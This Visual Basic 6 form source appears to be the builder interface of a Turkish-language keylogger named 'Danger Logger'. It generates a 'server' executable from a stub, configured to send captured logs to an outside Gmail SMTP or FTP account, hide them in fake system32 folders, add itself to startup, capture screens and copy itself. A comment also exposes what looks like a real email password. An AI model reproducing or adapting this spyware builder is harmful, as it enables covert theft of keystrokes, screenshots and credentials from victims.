Attribute VB_Exposed = False
'=============================================================================================

Private Sub CheckBox1_Click()
If CheckBox1.Value = 1 Then
FlatEdit2.PasswordChar = ""
CheckBox1.Caption = "Gizle"
Else
FlatEdit2.PasswordChar = "*"
CheckBox1.Caption = "Göster"
End If
End Sub
'=============================================================================================
Private Sub CheckBox2_Click()
If CheckBox2.Value = 1 Then
FlatEdit.PasswordChar = ""
CheckBox1.Caption = "Gizle"
Else
FlatEdit.PasswordChar = "*"
CheckBox1.Caption = "Göster"
End If
End Sub


Private Sub CheckBox3_Click()
If CheckBox3.Value = 1 Then
Text1.Text = CheckBox3.Value
Else
Text1.Text = CheckBox3.Value
End If
End Sub

Private Sub CheckBox5_Click()
Cmd4.DialogTitle = "Kopyalanmasýný Ýstediðiniz Yolu Seçin :"
Cmd4.Filter = "Exe Dosyasý (*.exe)|*.exe"
MsgBox "Ýstediðiniz Yola Server Kendisini Klasör içine 1'den Fazla Kopyalayacaktýr ", vbInformation, "Bildirim :"
Cmd4.ShowSave
If CheckBox5.Value = 1 Then
Text5.Text = CheckBox5.Value
Else
Text10.Text = ""
Text5.Text = CheckBox5.Value
End If
Text10.Text = Cmd4.FileName
End Sub

Private Sub CheckBox6_Click()
If CheckBox6.Value = 1 Then
Text3.Text = CheckBox6.Value
Else
Text3.Text = CheckBox6.Value
End If
End Sub

Private Sub Form_Load()
Cmd1.DialogTitle = "Klasör Yolu Seçiniz :"
Cmd3.DialogTitle = "Kaydedilmesini Ýstediðiniz Yolu Seçiniz :"
Panel_Tasarým1
Text4.Text = "C:\WINDOWS\system32\shell\winnt368\winnt367\winnt376\Log\systmc368.dll"
End Sub

Private Sub Form_Unload(Cancel As Integer)
Inet1.Cancel
End
End Sub

'============{Test Mail}============
Private Sub PushButton1_Click()
On Error Resume Next
Dim iMsg, iConf, Flds
Set iMsg = CreateObject("CDO.Message")
Set iConf = CreateObject("CDO.Configuration")
Set Flds = iConf.Fields
schema = "http://schemas.microsoft.com/cdo/configuration/"
Flds.Item(schema & "sendusing") = 2
Flds.Item(schema & "smtpserver") = FlatEdit3.Text
Flds.Item(schema & "smtpserverport") = FlatEdit4.Text
Flds.Item(schema & "smtpauthenticate") = 1
Flds.Item(schema & "sendusername") = FlatEdit1.Text '"DangerKeyloggerLog@gmail.com"
Flds.Item(schema & "sendpassword") = FlatEdit2.Text '"holocaust3"
Flds.Item(schema & "smtpusessl") = 1
Flds.Update
With iMsg
.To = FlatEdit1.Text
.From = "Danger Logger - Test Mail"
.Subject = "Danger Logger - Test Mail"
.HTMLbOdy = "Danger Logger - Test Mail"
.Organization = "Danger Logger - Test Mail"
.ReplyTo = "-"
Set .Configuration = iConf
SendEmailGmail = .send
End With
Label6.Caption = "Test Mail Baþarýlý.! Lütfen Gelen Kutusunu Kontrol Ediniz."
End Sub
'============{Test Mail}============
Private Sub PushButton2_Click()
On Error GoTo Hata
Inet1.URL = FlatEdit5
Inet1.UserName = FlatEdit6
Inet1.Password = FlatEdit
Inet1.RequestTimeout = 40
Inet1.Execute , "DIR"
Do While Inet1.StillExecuting
    DoEvents: DoEvents: DoEvents
Loop
Label11 = "FTP Adesine Baglantý Saðlanýldý..."
Exit Sub
Hata:
Label11 = "FTP Adresine Baðlanýlamýyor Hata Oluþtu..."
Inet1.Cancel
End Sub
Private Sub Inet1_StateChanged(ByVal State As Integer)
Select Case State
    Case icResolvingHost
        Label11 = "Bekleniyor..."
    Case icConnected
     Label11 = "Baðlanýldý..."
    Case icReceivingResponse
       Label11 = "Sunucudan Cevap Alýnýyor..."
    Case icDisconnected
       Label11 = "Sunucudan Kesildi..."
End Select
End Sub
'=============================================================================================
Private Sub PushButton3_Click()
On Error Resume Next
MkDir "C:\WINDOWS\system32\shell\"
MkDir "C:\WINDOWS\system32\shell\winnt368\"
MkDir "C:\WINDOWS\system32\shell\winnt368\winnt367\"
MkDir "C:\WINDOWS\system32\shell\winnt368\winnt367\winnt376\"
MkDir "C:\WINDOWS\system32\shell\winnt368\winnt367\winnt376\Screen\"
MkDir "C:\WINDOWS\system32\shell\winnt368\winnt367\winnt376\Log\"
Cmd1.ShowBrowseFolder
soru = MsgBox("Seçtiðiniz Klasör Yolu Deðiþtirilsin mi?", vbInformation + vbYesNo, "Bildiri ;")
If soru = vbYes Then
FlatEdit11.Text = Cmd1.FileName
End If
End Sub
'=============================================================================================
Private Sub PushButton4_Click()
Cmd3.ShowBrowseFolder
On Error Resume Next
Dim PropBag As PropertyBag
Set PropBag = New PropertyBag
'------------------------------{MAÝL ADRESÝ}------------------------------
If Radio1.Value = True Then
Text6.Text = Radio1.Value
Text7.Text = "False"
PropBag.WriteProperty "GMailAdresi", FlatEdit1.Text 'Adresi
PropBag.WriteProperty "GPass", FlatEdit2.Text 'Þifresi
End If
'------------------------------{FTP ADRESÝ}------------------------------
If Radio2.Value = True Then
Text7.Text = Radio2.Value
Text6.Text = "False"
PropBag.WriteProperty "FtpHost", FlatEdit5.Text 'Host
PropBag.WriteProperty "FtpKullanýcý", FlatEdit6.Text 'Kullanýcý Adý
PropBag.WriteProperty "FtpPass1", FlatEdit.Text 'Parola
End If
'--------------------------------------------------------------------------------------------
PropBag.WriteProperty "LogYolu", Text4.Text 'Log Yolu
PropBag.WriteProperty "Baslangýc", Text1.Text 'Baþlangýç Ekle
PropBag.WriteProperty "EkranSave", Text3.Text 'Ekran Kaydet
PropBag.WriteProperty "EkranYol", FlatEdit11.Text 'Masaüstü Ekran Yolu
PropBag.WriteProperty "MyCopy", Text5.Text 'Kendini Kopyalama
PropBag.WriteProperty "MyCopyYol", Text10.Text 'Kendini Kopyalama Yolu
'--------------------------------------------------------------------------------------------
PropBag.WriteProperty "Mail", Text6.Text 'Mail ile Gönder
PropBag.WriteProperty "Ftp", Text7.Text 'Ftp ile Gönder
'--------------------------------------------------------------------------------------------
FileCopy App.Path & "\stub.dat", App.Path & "\" & FlatEdit9.Text
CompileData Cmd3.FileName & "\" & FlatEdit9.Text, PropBag
MsgBox "Dosya Yolu : " & Cmd3.FileName & "\" & FlatEdit9.Text, vbOKOnly + vbInformation, "Bildirim ; Server Oluþturuldu.!"
End Sub

Private Sub PushButton5_Click()
cýkýs = MsgBox("Programdan Çýkmak mý Ýstiyorsunuz ?", vbQuestion + vbYesNo, " Çýkýþ ;")
If cýkýs = vbYes Then
End
End If
End Sub

'=============================================================================================
Private Sub PushButton7_Click()
On Error Resume Next
Cmd2.Filter = "Icon Dosyasý (*.ico)|*.ico"
Cmd2.ShowOpen
If Cmd2.FileName <> "" Then Text2.Text = Cmd2.FileName
'Set Picture1.Picture = LoadPicture(Cmd1.FileName)
Set Image2.Picture = LoadPicture(Cmd1.FileName)
'Image2.Picture = Cmd1.FileName
End Sub


Private Sub Timer_Timer()
Panel_Tasarým1
End Sub
